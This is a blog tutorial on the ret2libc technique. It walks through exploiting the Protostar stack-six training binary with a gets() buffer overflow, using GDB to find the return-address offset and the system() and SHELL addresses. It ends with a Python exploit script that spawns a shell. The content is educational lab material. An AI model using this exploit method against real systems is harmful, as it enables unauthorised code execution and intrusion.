# WTF is ret2libc?

After a long time of traditional stack-based overflow exploitation, the curiosity to break new possibilities always comes up. If you have never had any questions before, let me ask you a question:
As we know, the traditional exploit is to execute a shellcode that we put on the stack. Okay, but what if the stack is not executable? In that way, it would not be useful to return the shellcode, since it would never be executed. The name of this lock is [NX bit (Non eXecute)](http://en.wikipedia.org/wiki/NX_bit), and in this small tutorial/write-up, the goal is to exemplify how we can give a bypass and have a arbitrary code execution, not in the **NXbit** itself, since it is defined at compile time, and our example uses a simple conditional program check. Similar, but not equal.

*So I recommend you to get some popcorn, something to drink and relax, cuz we have a really tiring road of explanation and exemplification.*

## Let's Start

**ret2libc** (return to libc (or Arc injection)) is one of somes methods to go through this protection. Not far from the others stack-based exploits, this technique also consists of redirecting the flow of execution, however, where to?

### First of all, wtf is libc?
 
 *The libc" term is normally used as a short for the "standard C library", a standard library of functions that can be used by all C programs (and sometimes by programs in other languages). and cuz it is a task library, it contains common operations such as [I/O data](https://en.wikipedia.org/wiki/Entry/saidCode) and [String](https://en.wikipedia.org/wiki/String).*

## So finally, for God's sake, what's the use of ret2libc?

Before all your patience ends, try to imagine that: libc, being of common use, has a lot of functions. And of course, it is unlikely that all these functions are useless to the exploitation of binaries. The function commonly used in **ret2libc** is the function **system()** (I think things get interesting from here).
*For the sake of curiosity, I will use python to exemplify the use of a library with function ** system()***

```python
    #usr/bin/env python
    import os
    
    os.system('ping 8.8.8.8')
    print('\n')
    print("omg, we did it")
```

-----
    C:\Users\lynfs\Desktop>python example.py
    
    Disparando 8.8.8.8 com 32 bytes de dados:
    Resposta de 8.8.8.8: bytes=32 tempo=104ms TTL=44
    Resposta de 8.8.8.8: bytes=32 tempo=144ms TTL=44
    Resposta de 8.8.8.8: bytes=32 tempo=104ms TTL=44
    Resposta de 8.8.8.8: bytes=32 tempo=103ms TTL=44
    
    Estatísticas do Ping para 8.8.8.8:
        Pacotes: Enviados = 4, Recebidos = 4, Perdidos = 0 (0% de
                 perda),
    Aproximar um número redondo de vezes em milissegundos:
        Mínimo = 103ms, Máximo = 144ms, Média = 113ms
    
    
    omg, we did it

I think it's already clear where we want to go. In ret2libc (At least in the easyest/common), the idea is to replace the return address for libc, usually for this '**system()**' function (which only needs one argument) to execute an arbitrary command. In our case, let's explore the spawn of a **/bin/sh** through this function.

## Oright, let's do it

*in that example, the code to be used will be written in C. This binary is available in the virtual machine [Protostar](https://exploit.education/protostar/stack-six/) in level 6.*

```c
    #include <stdlib.h>
    #include <unistd.h>
    #include <stdio.h>
    #include <string.h>
    
    void getpath()
    {
      char buffer[64];
      unsigned int ret;
    
      printf("input path please: "); fflush(stdout);
    
      gets(buffer);
    
      ret = __builtin_return_address(0);
    
      if((ret & 0xbf000000) == 0xbf000000) {
          printf("bzzzt (%p)\n", ret);
          _exit(1);
      }
    
      printf("got path %s\n", buffer);
    }
    
    int main(int argc, char **argv)
    {
    
      getpath();
    
    }
```
---
````
gcc filename.c -o outputname -fno-stack-protector
````
* -fno-stack-protector is to disable **SSP** (smash-the-stack-protection), another method of protection that is not useful in this case.
---

*We will also use [python](https://www.python.org/downloads/) so that we do not get too deep into [GDB](https://www.gnu.org/software/gdb/), debugger used for our debugging.*

```python
    #!/usr/bin/env python
    import os
    import struct
    
    def main():
        padding = #valor inteiro qualquer
        payload = "A" * padding
        MeuPayload = open("payload.txt", "w")
        MeuPayload.write(payload)
        MeuPayload.close()
        os.system("cat payload.txt | CompiledFileName")
    main()
```

*For reading and understanding the python code, I recommend reading the [Struct python lib](https://docs.python.org/3/library/struct.html).*

### explaining the C code
* on Lines **8** and **9** we can see two variables defined: The first one is called "**buffer**", an array that receives a maximum size of **64 bytes**, and the second is an integer, called **"ret"**.
* On line **11** the program calls for user input, and on line **13**, that input is sent to the buffer variable. And yes, there is no verification if our input actually has 64 bytes size. But, we will not tell the management what the intern is doing, it will be our secret.
* On line **15** we can see the **ret** var, and a somewhat strange value, called **__ builtin_return_address(0)**. This is simply a reference to **Return Address**. okay, i know the intern is dropping the ball by storing it in a variable, but give him a chance to prove his worth.
* And on line **17**, our "little problem" comes up. A somewhat curious conditional structure: It is using a [Bitwise operation](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/Bitwise_Operators) to check if the return address has been overwritten with the "**0xbf**" byte. If the address starts with this byte, the program stop the execution.

Okay, I think the intern proved his worth. this conditional structure tells us that we can't overwrite **EIP** with no address beginning with "**0xbf**". And, this is a problem, because in this case, any shellcode that we could use to overwrite, would be in our Stack, and would start with **0xbf**, because **0xbf** is the beginning of the stack address given to the process. But, let's not priem panic, let's first worry about overwriting the **EIP** with anything.

* the start of the stack with address **0xbf** is only valid in that example. on your machine, different values will be allocated on stack.

## The gdb world

    gdb ./FileName


Now let's set some breakpoints to make debugging easier. Line 22, for example, is a great option, cuz at this stage of the program, our parameters have already been received and processed, but not printed yet. to define the breakpoint on line 22, we just need a simple command, as can be seen below: 

`(gdb) break 22`

Well, let's continue. To send our **payload.txt** file created by **.Py**, we use the command:

`run < payload.txt`

*Or, if you want to do it manually, you can use python:*

`r <<< $(python -c 'print "A"*4')`

Okay, now that we've reached our breakpoint, we can stop and analyze the memory. More specifically the **stack frame**. that is where our payload will be as well as the **EIP***
`(gdb) x / 32x $ esp`

![gdsc](/assets/nZdulIl.png)

Boom! there are our **A's**. And the best, they're exactly where we put it on the stack-frame. Our **A's** start at address **0xbffff77c** and go at **0xbffff77f**. Great, now that we have this information, we just need to look for the **EIP** to find out the size of our payload. 

`(gdb) info frame`

![gdbeip](/assets/FmPRmXG.png)

Success! now we know that the **EIP** is at **0xbffff7cc** memory address (highlighted in red) and contains the address **0x08048505** (highlighted in green). And, look, it's not that far from our first address. We can check the distance between them with the following command:

`p 0xbffff7cc - 0xbffff77c`

`(gdb) p 0xbffff7cc - 0xbffff77c`

`$1 = 80`

`(gdb)`

80. And if you ask yourself, "How useful is this 80?", This is the amount of **A's** for our overflow to **EIP**. But be careful: this will not cause **EIP** to be overwritten, however, it will be 1 byte to do. 

let's change the python script and put what we've found.

```python
    #!/usr/bin/env python
    import os
    import struct
    
    def main():
        padding = 80
        payload = "A" * padding
        MyPayload = open("payload.txt", "w")
        MyPayload.write(payload)
        MyPayload.close()
        os.system("cat payload.txt | CompiledCFileName")
    
    main()
```

*After execution:*
                                                          
    > python example.py                                                                          
    input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
    Segmentation Fault 

Okay, nothing much different though, we did get a segmentation fault. 

## Starting with system()

To find the address of the system function, we need restart our application, reset the breakpoint, enter anything in the input, ex ("AAAA") and when we break, use the command: 

`(gdb) p system`

This command will return not only basic information about the **system** function, but also its address.

![infosys](/assets/jhUSEUr.png)

Awesome, uh? Well, let's change the python script again:

```python
    #!/usr/bin/env python
    import os
    import struct
    
    def main():
        system_addr = struct.pack("I", 0xb7ecffb0)
        padding = 80
        payload = "A" * padding + system_addr + "LMAO"
        MyPayload = open("payload.txt", "w")
        MyPayload.write(payload)
        MyPayload.close()
        os.system("cat payload.txt | CompiledCFileName")
    
    main()
```

We made two changes: 1st was to add the system address on script, and the second one may seem strange, but i'll explain.

By default, our payload must follow a build structure:
**[QuantBytesToEIP] | [system_addr] | [4 random bytes] | [Address of /bin/sh]**. This is cuz of [Prologue Function](https://en.wikipedia.org/wiki/Function_prologue), basically a preparation that tells the stack frame what's function to use. The first argument to the system function is sent four bytes after the initial call to the function, cuz we can't give a CALL in a function, but we can simulate something like that. After we overwrite the return address with the address of the system function, we are "simulating" a **CALL** in it, so the architecture "requests" a return address to return that function. For the exploration in question, the use of a 4-bytes junk is enough for us, cuz theoretically we will not have to return to anything after executing the shellcode. At first, we needn't care to go into every details, just take it as truth and move on!

## /bin/sh, where r u?

To find the bin/sh address, there are some ways. searching for examples on the web, you can find somethings like: 

*   `x/s *(environ++) `
*   *filters through the own shell*
*   ...

Searching for the environ is kinda interesting. by default, the environ var has a memory address, and at this address, there is another memory address, which has the environment variables. ++ represents a counter, ranging from 1 to the limit of environment variables. In this case, it would be necessary to add +1 and +1 until we find the /bin/sh address. However, this method is somewhat hard, cuz the environment variable changes its address from within the GDB out. So, what to do? 
so, let's write another C code:

```c
    #include <stdio.h>
    #include <stdlib.h>
    
    int main(int argc, char *argv[])
    {
        char *adress= getenv("SHELL");
        printf("sh is at %p\n",adress);
    }
```

`gcc -o OutputName ProgramName`

`chmod +x OutputName`

`./OutputName`

*out output:*

`> ./sh_cmon`

`sh is at 0xbffff9de`

now we have everything we need to set up our script. Let's, then, modify it for the last time!

```python
    #!/usr/bin/env python
    import os
    import struct
    
    def main():
        system_addr = struct.pack("I", 0xb7ecffb0)
        sh_addr = struct.pack("I", 0xbffff9de)
        padding = 80
        payload = "A" * padding + system_addr + "LMAO" + sh_addr
        MyPayload = open("payload.txt", "w")
        MyPayload.write(payload)
        MyPayload.close()
        os.system("(cat payload.txt; cat) | CompiledCFileName")
    
    main()
```

![gotit](/assets/4s2HuZD.png)

*And, we got it!*

## Concluding remarks

So we have our shell exploring ret2libc and we've finished our little introduction to one of the stack-based keep methods, "**and we never run any code on the stack**". Remembering, of course, that this isn't the only way to explore the libc functions, however, it is the most well known and very common way to find in [CTF Challenges](https://github.com/lynfs/writeups) with not so high protection levels. I hope somehow this post will be useful to you in life, or in some other world. Otherwise, **Lets [pwn](https://github.com/lynfs/writeups/tree/master/pwn) the world!**